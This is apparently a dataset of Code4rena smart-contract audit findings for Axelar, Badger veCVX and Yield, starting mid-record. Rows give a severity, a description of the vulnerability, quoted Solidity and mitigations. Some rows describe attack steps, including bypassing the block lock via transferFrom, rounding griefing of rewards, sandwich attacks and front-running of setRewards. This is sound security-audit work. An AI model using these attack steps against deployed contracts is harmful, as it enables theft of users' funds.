I suggest a similar design for cross-chain contract calls, with one major difference: the token should still be burned on the source chain but it should be re-minted and refunded in case of a contract call failure on the destination chain. The steps would be roughly this:

*   User calls `AxelarGateway.callContractWithToken()` and tokens are burned
*   Steps 3 - 8 from the [competition page](https://code4rena.com/contests/2022-04-axelar-network-contest#cross-chain-smart-contract-call) occur as normal.
*   However, the call to `executeWithToken` in step 8 now fails. This is monitored by the Axelar Network and a new event e.g. `ContractCalledFailed` is emitted on the *destination chain*.
*   One the *source chain* the Axelar Network emits a new event e.g. `ContractCallFailedWithRefund`. This causes a re-minting of the tokens and a refund to the user to occur. The event should also be observable by the user. It should contain a reason for the contract call failure so that they are informed as to why it failed





***"
109.md,Low level call returns true if the address doesn't exist,medium,"[AxelarGateway.sol#L545-L548](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L545-L548)<br>
[AxelarGatewayProxy.sol#L16-L24](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGatewayProxy.sol#L16-L24)<br>

As written in the [solidity documentation](https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions), the low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.

### Proof of Concept

The low-level functions `call` and `delegatecall` are used in some places in the code and it can be problematic. For example, in the `_callERC20Token` of the `AxelarGateway` contract there is a low level call in order to call the ERC20 functions, but if the given `tokenAddress` doesn't exist `success` will be equal to true and the function will return true and the code execution will be continued like the call was successful.

```sol
function _callERC20Token(address tokenAddress, bytes memory callData) internal returns (bool) {
    (bool success, bytes memory returnData) = tokenAddress.call(callData);
    return success && (returnData.length == uint256(0) || abi.decode(returnData, (bool)));
}
```

Another place that this can happen is in `AxelarGatewayProxy`'s constructor

```sol
constructor(address gatewayImplementation, bytes memory params) {
    _setAddress(KEY_IMPLEMENTATION, gatewayImplementation);

   (bool success, ) = gatewayImplementation.delegatecall(
       abi.encodeWithSelector(IAxelarGateway.setup.selector, params)
   );

    if (!success) revert SetupFailed();
}
```

If the `gatewayImplementation` address doesn't exist, the delegate call will return true and the function won't revert.

### Tools Used

Remix, VS Code

### Recommended Mitigation Steps

Check before any low-level call that the address actually exists, for example before the low level call in the callERC20 function you can check that the address is a contract by checking its code size.





***"
109.md,User's funds can get lost when transferring to other chain,medium,"[AxelarGateway.sol#L384-L389](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L384-L389)<br>

When transferring tokens to other chain, the tokens in the source chain are burned - if they are external they will be transferred to the AxelarGateway, otherwise they will be burned. In the target chain the same amount of tokens will be minted for the user - if it is external it will be transferred to him from the AxelarGateway, otherwise it will be minted to him.<br>
But there is a problem - if the AxelarGateway doesn't have the needed amount of token for some reason, the `_callERC20Token` with the `transfer` function selector will fail and return false, which will make the `_mintToken` function revert. Because it reverted, the user won't get his funds on the destination chain, although he payed the needed amount in the source chain.

### Tools Used

VS Code and Remix

### Recommended Mitigation Steps

Instead of reverting when the transfer is not successful, simply call the `callContractWithToken` with the source chain as the destination chain in order to return the user his funds.




***"
109.md,"`_execute` can potentially reorder a batch of commands while executing, breaking any assumptions on command orders.",medium,"[AxelarGatewayMultisig.sol#L484](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L484)<br>
[AxelarGatewayMultisig.sol#L490](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L490)<br>
[AxelarGatewayMultisig.sol#L529](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L529)<br>

Since this is important, we quote it again instead of referring to our other bug report on a different, yet related bug. The context within which a command is executed is extremely important.

> AxelarGatewayMultisig.execute() takes a signed batch of commands. Each command has a corresponding commandID. This is guaranteed to be unique from the Axelar network. execute intentionally allows retrying a commandID if the command failed to be processed; this is because commands are state dependent, and someone might submit command 2 before command 1 causing it to fail.

Thus if an attacker manages to rearrange execution order of commands within a batch, it should probably be treated seriously. This is exactly what might happen here due to reentrancy. A malicious player that managed to gain reentrancy over execute can easily execute later commands in a batch before earlier commands are fully executed, effectively breaking all assumptions on command executed context.

### Proof of Concept

The `_execute` function and its wrapper `execute` are both reentrant.

        function execute(bytes calldata input) external override;
        function _execute(bytes memory data, bytes[] memory signatures) internal;

Thus if an attacker manages to reenter the `_execute` function with the same batch of commands and signatures, previously successfully executed and ongoing commands will be skipped due to premature marking of the success flag.

            if (isCommandExecuted(commandId)) continue; /* Ignore if duplicate commandId received */

This allows later commands to be executed before the current ongoing command is finished. The reentrant attack can be nested to perform further reordering of commands.

Generally speaking, other unrelated batches of signed commands can only be executed, but since the assumption of ordering is most likely stronger within a single batch, we focus on illustrating the single batch scenario above.

### Tools Used

vim, ganache-cli

### Recommended Mitigation Steps

Make execute nonReentrant

Add an ever increasing nonce to signatures to prevent replay

        function execute(bytes calldata input) nonReentrant external override {
            ...
        }





***"
109.md,Unsupported fee-on-transfer tokens,medium,"When tokenAddress is fee-on-transfer tokens, in the \_burnTokenFrom function, the actual amount of tokens received by the contract will be less than the amount.

### Proof of Concept

[AxelarGateway.sol#L284-L334](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L284-L334)<br>

### Recommended Mitigation Steps

Consider getting the received amount by calculating the difference of token balance (using balanceOf) before and after the transferFrom.




***"
31.md,`veCVXStrategy.manualRebalance` has wrong logic,high,"The `veCVXStrategy.manualRebalance` function computes two ratios `currentLockRatio` and `newLockRatio` and compares them.

However, these ratios compute different things and are not comparable:

*   `currentLockRatio = balanceInLock.mul(10**18).div(totalCVXBalance)` is a **percentage value** with 18 decimals (i.e. `1e18 = 100%`). Its max value can at most be `1e18`.
*   `newLockRatio = totalCVXBalance.mul(toLock).div(MAX_BPS)` is a **CVX token amount**. It's unbounded and just depends on the `totalCVXBalance` amount.

The comparison that follows does not make sense:

```solidity
if (newLockRatio <= currentLockRatio) {
  // ...
}
```

#### Impact
The rebalancing is broken and does not correctly rebalance. It usually leads to locking nearly everything if `totalCVXBalance` is high.

#### Recommended Mitigation Steps
Judging from the `cvxToLock = newLockRatio.sub(currentLockRatio)` it seems the desired computation is that the ""ratios"" should actually be in CVX amounts and not in percentages. Therefore, `currentLockRatio` should just be `balanceInLock`. (The variables should be renamed as they aren't really ratios but absolute CVX balance amounts.)"
31.md,`SettV3.transferFrom` block lock can be circumvented,medium,"The `SettV3.transferFrom` implements a `_blockLocked` call to prevent users to call several functions at once, for example, `deposit` and then `transfer`ring the tokens.

```solidity
function _blockLocked() internal view {
    require(blockLock[msg.sender] < block.number, ""blockLocked"");
}
```

However, as the block lock only checks `msg.sender`, an attacker can circumvent it using `transferFrom`:

*   Attacker owns accounts `A`, `B` and `C`
*   A deposits, `_lockForBlock(msg.sender) = _lockForBlock(A)` is called and `A` is locked.
*   A approves B.
*   B calls `transferFrom(from=A, to=C, amount)`. This passes the `_blockLocked() = _blockLocked(B)` check.
*   C calls `withdraw()`.

#### Impact
The protection desired from the `_blockLocked` call does not work for this function.
I assume the call is used to prevent flashloan attacks, but an attacker can bypass the protection on `transferFrom`.

#### Recommended Mitigation Steps
The block lock should be on the account that holds the tokens, i.e., on `sender` (""from"" address), not on `msg.sender`.
Parameterize `_blockLocked` to take an account parameter instead."
31.md,`CvxLocker.setBoost` wrong validation,medium,"The `CvxLocker.setBoost` function does not validate the `_max, _rate` parameters, instead it validates the already set **storage** variables.

```solidity
// @audit this is checking the already-set storage variables, not the parameters
require(maximumBoostPayment < 1500, ""over max payment""); //max 15%
require(boostRate < 30000, ""over max rate""); //max 3x
```

#### Impact
Once wrong boost values are set (which are not validated when they are set), they cannot be set to new values anymore, breaking core contract functionality.

#### Recommended Mitigation Steps
Implement these two checks instead:

```solidity
require(_max < 1500, ""over max payment""); //max 15%
require(_rate < 30000, ""over max rate""); //max 3x
```"
31.md,add zero address validation in constructor and initializer,low,"#### Impact
parameter used in constructor and initilizer are used to initialize the state variable, error in these can lead to redeployment of contract

#### Proof of Concept
- [`veCVXStrategy.sol` L67](https://github.com/code-423n4/2021-09-bvecvx/blob/1d64bd58c7a4224cc330cef283561e90ae6a3cf5/veCVX/contracts/veCVXStrategy.sol#L67)
- [`Controller.sol` L35](https://github.com/code-423n4/2021-09-bvecvx/blob/1d64bd58c7a4224cc330cef283561e90ae6a3cf5/veCVX/contracts/deps/Controller.sol#L35)

#### Tools Used
manual review

#### Recommended Mitigation Steps
add `address(0)` validation"
31.md,`CvxLocker.setStakeLimits` missing validation,low,"The `CvxLocker.setStakeLimits` function does not check `_minimum <= _maximum`.

#### Recommended Mitigation Steps
Implement these two checks instead:

```solidity
require(_minimum <= _maximum, ""min range"");
require(_maximum <= denominator, ""max range"");
```"
31.md,`CvxLocker.setApprovals` can be called by anyone,low,"The `CvxLocker.setApprovals` function is callable by anyone, not only by the owner/admin.

#### Impact
It's okay for this function to be callable by anyone.

#### Recommended Mitigation Steps
Remove the comment that these are admin-only functions (`ADMIN CONFIGURATION` section) as this is not true for `setApprovals` and one does not know if it's intended to be admin-only or not."
31.md,`CvxLocker.findEpochId` stops after 128 iterations,low,"It's unclear why the binary search algorithm stops after `128` iterations.

#### Impact
It might not return the actual epoch id (although very unlikely as 128 iterations should be sufficient.)

#### Recommended Mitigation Steps
Use a `while (max > min)` loop instead of the `for` loop with a fixed number of iterations.

`uint256 mid = (min + max + 1) / 2;` is also not using safe math."
31.md,Unbounded iteration in `CvxLocker.updateReward`,low,"The `CvxLocker.updateReward` iterates over all `rewardTokens`.

#### Impact
The transactions can fail if the arrays get too big and the transaction would consume more gas than the block limit.
This will then result in a denial of service for the desired functionality and break core functionality.

#### Recommended Mitigation Steps
Keep the number of `rewardTokens` small."
31.md,Missing slippage/min-return check in `veCVXStrategy`,low,"The contracts are missing slippage checks which can lead to being vulnerable to sandwich attacks.

> A common attack in DeFi is the sandwich attack. Upon observing a trade of asset X for asset Y, an attacker frontruns the victim trade by also buying asset Y, lets the victim execute the trade, and then backruns (executes after) the victim by trading back the amount gained in the first trade. Intuitively, one uses the knowledge that someone’s going to buy an asset, and that this trade will increase its price, to make a profit. The attacker’s plan is to buy this asset cheap, let the victim buy at an increased price, and then sell the received amount again at a higher price afterwards.

See `veCVXStrategy._swapcvxCRVToWant`:

```solidity
IUniswapRouterV2(SUSHI_ROUTER).swapExactTokensForTokens(
    toSwap,
    0, // @audit min. return of zero, no slippage check
    path,
    address(this),
    now
);
```

#### Impact
Trades can happen at a bad price and lead to receiving fewer tokens than at a fair market price. The attacker's profit is the protocol's loss.

#### Recommended Mitigation Steps
Add minimum return amount checks.

Accept a function parameter that can be chosen by the transaction sender, then check that the actually received amount is above this parameter.

Alternatively, check if it's feasible to send these transactions directly to a miner such that they are not visible in the public mempool."
31.md,Missing slippage/min-return check in `StrategyCvxHelper`,low,"The contracts are missing slippage checks which can lead to being vulnerable to sandwich attacks.

> A common attack in DeFi is the sandwich attack. Upon observing a trade of asset X for asset Y, an attacker frontruns the victim trade by also buying asset Y, lets the victim execute the trade, and then backruns (executes after) the victim by trading back the amount gained in the first trade. Intuitively, one uses the knowledge that someone’s going to buy an asset, and that this trade will increase its price, to make a profit. The attacker’s plan is to buy this asset cheap, let the victim buy at an increased price, and then sell the received amount again at a higher price afterwards.

See `StrategyCvxHelper.harvest`:

```solidity
_swapExactTokensForTokens(sushiswap, cvxCrv, cvxCrvBalance, getTokenSwapPath(cvxCrv, cvx));
// @audit calls UniSwapper._swapExactTokensForTokens:
IUniswapRouterV2(router).swapExactTokensForTokens(balance, 0 /* zero min return */, path, address(this), now);
```

#### Impact
Trades can happen at a bad price and lead to receiving fewer tokens than at a fair market price. The attacker's profit is the protocol's loss.

#### Recommended Mitigation Steps
Add minimum return amount checks.
Accept a function parameter that can be chosen by the transaction sender, then check that the actually received amount is above this parameter.

Alternatively, check if it's feasible to send these transactions directly to a miner such that they are not visible in the public mempool."
31.md,Missing slippage/min-return check in `BaseStrategy`,low,"The contracts are missing slippage checks which can lead to being vulnerable to sandwich attacks.

> A common attack in DeFi is the sandwich attack. Upon observing a trade of asset X for asset Y, an attacker frontruns the victim trade by also buying asset Y, lets the victim execute the trade, and then backruns (executes after) the victim by trading back the amount gained in the first trade. Intuitively, one uses the knowledge that someone’s going to buy an asset, and that this trade will increase its price, to make a profit. The attacker’s plan is to buy this asset cheap, let the victim buy at an increased price, and then sell the received amount again at a higher price afterwards.

See `BaseStrategy._swap`:

```solidity
IUniswapRouterV2(uniswap).swapExactTokensForTokens(balance, 0 /* zero min return */,path, address(this), now);
```

#### Impact
Trades can happen at a bad price and lead to receiving fewer tokens than at a fair market price.
The attacker's profit is the protocol's loss.

#### Recommended Mitigation Steps
Add minimum return amount checks.
Accept a function parameter that can be chosen by the transaction sender, then check that the actually received amount is above this parameter.

Alternatively, check if it's feasible to send these transactions directly to a miner such that they are not visible in the public mempool."
31.md,StrategyCvxHelper: `safeApprove` instead of `approve`,low,"This was probably an oversight since

*   the veCVXStrategy contract used `safeApprove()` for token approvals
*   `using SafeERC20Upgradeable for IERC20Upgradeable;` was declared

##### Recommended Mitigation Steps
Change

`cvxToken.approve(address(cvxRewardsPool), MAX_UINT_256);`

to

`cvxToken.safeApprove(address(cvxRewardsPool), MAX_UINT_256);`"
31.md,Swap conversion is susceptible to MEV flashbots,low,"##### Impact
In `veCVXStrategy`, the `cvxCRV -> ETH -> CVX` conversion via sushiswap is done with 0 `minAmountOut`, making it susceptible to sandwich attacks / MEV flashbots. This is also true for `UniSwapper` inherited by `StrategyCvxHelper`.

##### Recommended Mitigation Steps
1.  `veCVXStrategy`

    Ideally, the `harvest()` function should take in a `minAmountOut` parameter, but this breaks the Yearn architecture used. Using TWAPs / price oracles might alleviate the problem, but results in higher gas usage, and with multiple hops involved, may not be feasible.

    A simpler approach would be to have a configurable storage variable `minAmountOut`. Its value can then be adjusted such that harvesting can be done infrequently to save gas.

2.  `UniSwapper`

    Ideally, each path registered in the `TokenSwapPathRegistry` should also have a `minAmount` mapping, that can be fetched together with the path."
31.md,veCVXStrategy: Sub-optimal trading path,low,"##### Impact
`_swapcvxCRVToWant()` swaps `cvxCRV -> ETH -> CVX` via sushiswap.

Looking at sushiswap analytics, this may also not be the most optimal trading path. The cvxCRV-CRV pool seems to have substantially better liquidity than the cvxCRV-ETH pool as reported [here](https://www.notion.so/6a2dc64a1969e19c23e4f579f9810aa7) (Note that cvxCRV-CRV's liquidity is overstated, [clicking into the pool](https://www.notion.so/a2a8a54062e021873bcaee006cdf4007) gives a more reasonable amount). It is therefore better to do `cvxCRV -> CRV -> ETH -> CVX`, though this comes at the cost of higher gas usage.

##### Recommended Mitigation Steps
Switch the trading path to `cvxCRV -> CRV -> ETH -> CVX`, as it means more CVX tokens received, translating to higher APY, while the higher gas cost is borne by the caller.

Additionally, given how liquidity can shift between pools over time, the most optimal trade path may change accordingly. Hence, it may be beneficial to make the pool path configurable."
31.md,Functions not returning declared values,low,"#### Impact
function `withdrawAll` in `BaseStrategy` declares 'returns (uint256 balance)', however, no actual value is returned. function reinvest in `MyStrategy` declares to return 'uint256 reinvested', however, it also actually does not return anything so they always get assigned a default value of 0.

#### Recommended Mitigation Steps
Either remove the return declarations or return the intended values. Otherwise, it may confuse other protocols that later may want to integrate with you."
31.md,Frontrunning `distribute` functions,low,"#### Impact
`distribute` and `distributeOther` can be frontrunned. Anyone can call these functions and receive `callIncentive`. A frontrunner can watch the mempool and copy the calldata to replicate the same tx. For example, a frontrunner calculates that replicating this tx will result in profit, he watches and copies the tx, then instantly sell these received incentives on AMM for profit. This may result in reverted txs, gas wasted, and a poor experience for legit users.

#### Recommended Mitigation Steps
This problem seems insurmountable in this case but you may want to consider adding restrictions on the callers or introducing any other possible prevention techniques."
31.md,Faulty return value in `veCVXStrategy::reinvest()`,low,"#### Impact
The function `reinvest` in the veCVXStrategy always returns 0 as the return variable `reinvested` is never updated.
The function is `onlyGovernance` and the return value probably does not matter if the caller is a multi-sig. However, if a protocol is set as `onlyGovernance` the faulty return value would have to be ignored by the caller to not transition into an incorrect state.

#### Proof of Concept
The variable `reinvested` is declared as return variable ([line 400](https://github.com/code-423n4/2021-09-bvecvx/blob/32ecfd005d421f29c3846f4609fec33eaad388b9/veCVX/contracts/veCVXStrategy.sol#L400)) but not updated to reflect the actual amount reinvested which is saved in variable `toDeposit`.

Therefore always the default value is returned (0).

#### Recommended Mitigation Steps
Add `reinvested = toDeposit;` after line 412."
31.md,`setKeepReward` function is unfinished,low,"#### Impact
The `setKeepReward` function is unfinished.

#### Proof of Concept
[`veCVXStrategy.sol` L203](https://github.com/code-423n4/2021-09-bvecvx/blob/1d64bd58c7a4224cc330cef283561e90ae6a3cf5/veCVX/contracts/veCVXStrategy.sol#L203)

#### Recommended Mitigation Steps
Either complete the function or follow the comment above the code and remove it."
31.md,Don't include unused functions,low,"#### Impact
The code includes unused functions, like `tend()`, [L319](https://github.com/code-423n4/2021-09-bvecvx/blob/1d64bd58c7a4224cc330cef283561e90ae6a3cf5/veCVX/contracts/veCVXStrategy.sol#L319). It's best practice to remove these. It will also save gas.

#### Recommended Mitigation Steps
Remove the unused function."
31.md,Reentrancy on `distributeOther()`,low,"#### Impact
The `distribute` function can be re-entered by fake tokens or tokens with callbacks.
An attacker can use the callbacks on `safeTransfer` if a token has a callback to reenter an drain the entire balance of that particular token before the `notifyRewardAmount` is called.

I think this is only a medium issue because the attacker can only take tokens with callbacks, and I don't think any of the tokens you guys use have callbacks.

#### Proof of Concept
[`CvxStakingProxy.sol` L153](https://github.com/code-423n4/2021-09-bvecvx/blob/1d64bd58c7a4224cc330cef283561e90ae6a3cf5/veCVX/contracts/locker/CvxStakingProxy.sol#L153)

#### Recommended Mitigation Steps
Be aware of this possibility. If you really want to, add a `nonReentrant` modifier to the function."
31.md,`ManualRebalance` will be frontrun for most of the tokens.,low,"#### Impact
We have previously seen that the `harvest` function can be exploited for almost all the tokens at stake.
Since `ManualRebalance` calls `harvest`, it is also unsafe and funds swapped using it will likely be lost.

#### Proof of Concept
[`sol#L444` L453](https://github.com/code-423n4/2021-09-bvecvx/blob/1d64bd58c7a4224cc330cef283561e90ae6a3cf5/veCVX/contracts/veCVXStrategy.sol#L444-L453)

#### Recommended Mitigation Steps
Adding an amount out minimum here will work that should be passed on to the `harvest` method."
25.md,`CompositeMultiOracle` returns wrong decimals for prices?,high,"The `CompositeMultiOracle.peek/get` functions seem to return wrong prices.
It's unclear what decimals `source.decimals` refers to in this case. Does it refer to `source.source` token decimals?

It chains the price arguments through `_peek` function calls and a single price is computed as:

```solidity
(priceOut, updateTimeOut) = IOracle(source.source).peek(base, quote, 10 ** source.decimals);   // Get price for one unit
// @audit shouldn't this divide by 10 ** IOracle(source.source).decimals() instead?
priceOut = priceIn * priceOut / (10 ** source.decimals);
```

Assume all oracles use 18 decimals (`oracle.decimals()` returns 18) and `source.decimals` refers to the _token decimals_ of `source.source`.

Then going from `USDC -> DAI -> USDT` (`path = [DAI]`) starts with a price of `1e18` in `peek`:
- `_peek(USDC, DAI, 1e18)`: Gets the price of `1e6 USDC` (as USDC has 6 decimals) in DAI with 18 decimals precision (because all oracle precision is set to 18): `priceOut = priceIn * 1e18 / 1e6 = 1e18 * 1e18 / 1e6 = 1e30`
- `_peek(DAI, USDT, 1e30)`: Gets the price of `1e18 DAI` (DAI has 18 decimals) with 18 decimals precision: `priceOut = priceIn * 1e18 / 1e18 = priceIn = 1e30`

It then uses `1e30` as the price to go from `USDC` to `USDT`: `value = price * amount / 1e18 = 1e30 * (1.0 USDC) / 1e18 = 1e30 * 1e6 / 1e18 = 1e18 = 1e12 * 1e6 = 1_000_000_000_000.0 USDT`. Inflating the actual `USDT` amount.

The issue is that `peek` assumes that the final price is in 18 decimals in the `value = price * amount / 1e18` division by `1e18`.
But `_peek` (and `_get`) don't enforce this.

Recommend that `_peek` should scale the prices to `1e18` by doing:

```solidity
(priceOut, updateTimeOut) = IOracle(source.source).get(base, quote, 10 ** source.decimals);
// priceOut will have same decimals as priceIn if we divide by oracle decimals
priceOut = priceIn * priceOut / (10 ** IOracle(source.source).decimals());
```

It does not need to divide by the `source.source` _token precision_ (`source.decimals`), but by the oracle precision (`IOracle(source.source).decimals()`)."
25.md,`ERC20Rewards` returns wrong rewards if no tokens initially exist,high,"The `ERC20Rewards._updateRewardsPerToken` function exits without updating `rewardsPerToken_.lastUpdated` if `totalSupply` is zero, i.e., if there are no tokens initially.

This leads to an error if there is an active rewards period but no tokens have been minted yet.

**Example:** `rewardsPeriod.start: 1 month ago`, `rewardsPeriod.end: in 1 month`, `totalSupply == 0`.

The first mint leads to the user (mintee) receiving all rewards for the past period (50% of the total rewards in this case).
- `_mint` is called, calls `_updateRewardsPerToken` which short-circuits. `rewardsPerToken.lastUpdated` is still set to `rewardsPeriod.start` from the constructor. Then `_updateUserRewards` is called and does not currently yield any rewards. (because both balance and the index diff are zero). User has now minted the tokens, `totalSupply` increases and user balance is set.
- User performs a `claim`: `_updateRewardsPerToken` is called and `timeSinceLastUpdated = end - rewardsPerToken_.lastUpdated = block.timestamp - rewardsPeriod.start = 1 month`. Contract ""issues"" rewards for the past month. The first mintee receives all of it.

The first mintee receives all pending rewards when they should not receive any past rewards.
This can easily happen if the token is new, the reward period has already been initialized and is running, but the protocol has not officially launched yet.
Note that `setRewards` also allows setting a date in the past which would also be fatal in this case.

Recommend that the `rewardsPerToken_.lastUpdated` field must always be updated in `_updateRewardsPerToken` to the current time (or `end`) even if `_totalSupply == 0`. Don't return early.

```solidity
function rewardPerToken() public view returns (uint256) {
  if (totalSupply() == 0) {
    return rewardPerTokenStored;
  }
```
>
> I'll apply the mitigation step suggested, with a conditional to not do the `rewardsPerToken_.accumulated` math that would revert.
>
> Now I know the feeling of the devs that fork a known project and leave a pesky conditional out, thanks again :D
>"
25.md,`ERC20Rewards` breaks when setting a different token,high,"The `setRewards` function allows setting a different token.
Holders of a previous reward period cannot all be paid out and will receive **their old reward amount** in the new token.

This leads to issues when the new token is more (less) valuable, or uses different decimals.

**Example:** Assume the first reward period paid out in `DAI` which has 18 decimals. Someone would have received `1.0 DAI = 1e18 DAI` if they called `claim` now. Instead, they wait until the new period starts with `USDC` (using only 6 decimals) and can `claim` their `1e18` reward amount in USDC which would equal `1e12 USDC`, one trillion USD.

Changing the reward token only works if old and new tokens use the same decimals and have the exact same value. Otherwise, users that claim too late/early will lose out.

Recommend disallowing changing the reward token, or clearing user's pending rewards of the old token. The second approach requires more code changes and keeping track of what token a user last claimed."
25.md,Rewards accumulated can stay constant and often not increment,high,"`rewardsPerToken_.accumulated` can stay constant while `rewardsPerToken_.lastUpdated` is continually updated, leading to no actual rewards being distributed. I.e. No rewards accumulate.

Line 115, `rewardsPerToken_.accumulated` could stay constant if there are very quick update intervals, a relatively low `rewardsPerToken_.rate` and a decent supply of the ERC20 token.

I.e. imagine the token supply is 1 billion tokens (quite a common amount, note even if a supply of only say 1 million tokens this is still relevant). i.e. 1e27 wei.

Line 115 has
```solidity
1e18 * timeSinceLastUpdated * rewardsPerToken_.rate / _totalSupply
```

`timeSinceLastUpdated` can be crafted to be arbitrarily small by simply transferring or burning tokens, so lets exclude this term (it could be 10 seconds etc). Imagine total supply is 1e27 as mentioned.

Therefore, `1e18 * rewardsPerToken_.rate / 1e27`, which shows that if the `rewardsPerToken_.rate` is < 1e9, something which is very likely, then the accumulated amount won't increment, as there are no decimals in solidity and this line of code will evaluate to adding zero. While this is rounded down to zero, critically, ` rewardsPerToken_.lastUpdated = end;` is updated.

The reason I have labelled this as a high risk is the express purpose of this contract is to reward users with tokens, yet a user could potentially quite easily exploit this line to ensure no one ever gets rewards and the accumulated amount never increases.

Given a fairly large token supply, and a relatively low emissions rate is set, that satisfies the above equation, for the entire duration of the rewards period, the user simply sends tokens back and forth every couple seconds (gas limitations, but layer 2), to keep the delta `timeSinceLastUpdated` close to 1.

This way the accumulated amount will never tick up, but time keeps being counted.

Furthermore, I would say this is high risk as this wouldn't even need an attacker. Given the transfer function is likely often being called by users, `timeSinceLastUpdated` will naturally be very low anyways.

Even if not so extreme as the above case, Alberto points out that ""rounding can eat into the rewards"" which is likely to be prevalent in the current scenario and make a big impact over time on the targeted vs actual distribution.

Again, this problem is more likely to occur in naturally liquid tokens where lots of transfer, mint or burn events occur.

As suggested by Alberto, the simplest it to probably not update the `rewardsPerToken_.lastUpdated` field if `rewardsPerToken_.accumulated` does not change. Although this change should be closely scrutinized to see it doesn't introduce bugs elsewhere.

```solidity
struct RewardsPerToken {
  uint128 accumulated;                            // Accumulated rewards per token for the period, scaled up by 1e18
  uint32 lastUpdated;                             // Last time the rewards per token accumulator was updated
  uint96 rate;                                    // Wei rewarded per second among all token holders
}
```
>
> One of the largest cap tokens is Dai, with a distribution close to 1e28.
> If ERC20Rewards were to distribute 1 cent/second among all token holders (which wouldn't be very exciting), and block times were of 1 second, the accumulator would still accumulate.
>
> `accumulator += 1e18 (scaling) * 1 (seconds per block) * 1e16 (Dai wei / second) / 1e28 (Dai total supply)`
> The increase to the `accumulator` is of 1e6, which gives plenty of precision. I would expect a rewards program on Dai holders would be at least 1e6 larger per second.
>
> On the other hand, `accumulator` is an `uint128`, which holds amounts of up to 1e38. To overflow it we would need a low cap token (let's say USDC, with 1e15), and a high distribution (1e12 per second, which is unreal), and we run the program for 3 years, or 1e9, to make it easy.
>
> The accumulator at the end of the ten years would be:
> `accumulator = 1e18 (scaling) * 1e9 (seconds) * 1e12 (distribution) / 1e15 (supply) = 1e24`
> Which doesn't overflow."
25.md,Exchange rates from Compound are assumed with 18 decimals,high,"The `CTokenMultiOracle` contract assumes the exchange rates (borrowing rate) of Compound always have 18 decimals, while, however, which is not true. According to the [Compound documentation](https://compound.finance/docs/ctokens#exchange-rate), the exchange rate returned from the `exchangeRateCurrent` function is scaled by `1 * 10^(18 - 8 + Underlying Token Decimals)` (and so does `exchangeRateStored`). Using a wrong decimal number on the exchange rate could cause incorrect pricing on tokens. See [`CTokenMultiOracle.sol` #L110](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/oracles/compound/CTokenMultiOracle.sol#L110).

Recommend following the documentation and getting the decimals of the underlying tokens to set the correct decimal of a `Source`."
25.md,No ERC20 safe* versions called,medium,"The `claim` function performs an ERC20 transfer `rewardsToken.transfer(to, claiming);` but does not check the return value, nor does it work with all legacy tokens.

Some tokens (like USDT) don't correctly implement the EIP20 standard and their `transfer`/`transferFrom` function return `void` instead of a success boolean. Calling these functions with the correct EIP20 function signatures will always revert.

The `ERC20.transfer()` and `ERC20.transferFrom()` functions return a boolean value indicating success. This parameter needs to be checked for success.
Some tokens do **not** revert if the transfer failed but return `false` instead.

Tokens that don't actually perform the transfer and return `false` are still counted as a correct transfer and tokens that don't correctly implement the latest EIP20 spec, like USDT, will be unusable in the protocol as they revert the transaction because of the missing return value.

Recommend using OpenZeppelin’s `SafeERC20` versions with the `safeTransfer` and `safeTransferFrom` functions that handle the return value check as well as non-standard-compliant tokens."
25.md,`TimeLock` cannot schedule the same calls multiple times,medium,"The `TimeLock.schedule` function reverts if the same `targets` and `data` fields are used as the `txHash` will be the same.
This means one cannot schedule the same transactions multiple times.

Imagine the delay is set to 30 days, but a contractor needs to be paid every 2 weeks. One needs to wait 30 days before scheduling the second payment to them.

Recommend also including `eta` in the hash. (Compound's `Timelock` does it as well.) This way the same transaction data can be used by specifying a different `eta`."
25.md,Rewards squatting - setting rewards in different ERC20 tokens opens various economic attacks.,medium,"Users essentially have an option to either claim currently earned reward amounts on future rewards tokens, or the current rewards token.

Although stated on line 84, it does not take into account the implications the lock in this contract will have on the future value of new tokens able to be issued via rewards.

Smart users will monitor the mempool for `setRewards` transactions. If the new reward token (token b) is less valuable than the old reward token (token a), they can  front run this transaction by calling claim. Otherwise, they let their accrued 'token a' roll into rewards of of the more valuable 'token b'.

Given loads of users will likely hold these tokens from day 1, there will potentially be thousands of different addresses squatting on rewards.

Economically, and given the above, it makes sense that the value of new reward tokens, i.e. 'token b' should always be less than that of 'token a'. This is undesirable in a rewards token contract, as there is no reliable way to start issuing a more valuable token at a later stage, unless exposing yourself to a major risk of reward squatting.

i.e. You could not issue a more valuable token in future (for example, if we wanted to run a rewards period issuing an asset like WETH rewards for 10 days) after first initially issuing DAI as a reward. This hamstrings flexibility of the contract.

P.s. This is one of the slickest contracts I've read. Love how awesome it is.Just believe this should be fixed, then its good to go.

It is true you could probably write a script to manually go call `claim` on thousands of squatting token addresses but this is a poor solution.

Recommend instead, that a simple mapping pattern could be used with an index mapping to a reward cycle with a reward token and a new accumulative etc. Users would likely need to be given a period a to claim from old reward cycles before their token balance could no longer reliably used to calculate past rewards. The would still be able to claim everything up until their last action (even though this may be before the rewards cycle ended)."
25.md,Use `safeTransfer` instead of `transfer`,medium,"Tokens not compliant with the ERC20 specification could return `false` from the `transfer` function call to indicate the transfer fails, while the calling contract would not notice the failure if the return value is not checked. Checking the return value is a requirement, as written in the [EIP-20](https://eips.ethereum.org/EIPS/eip-20) specification:
> Callers MUST handle `false` from `returns (bool success)`. Callers MUST NOT assume that `false` is never returned!

See [ERC20Rewards.sol L175](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/utils/token/ERC20Rewards.sol#L175).

Recommend using the `SafeERC20` library [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) from OpenZeppelin and calling `safeTransfer` or `safeTransferFrom` when transferring ERC20 tokens."
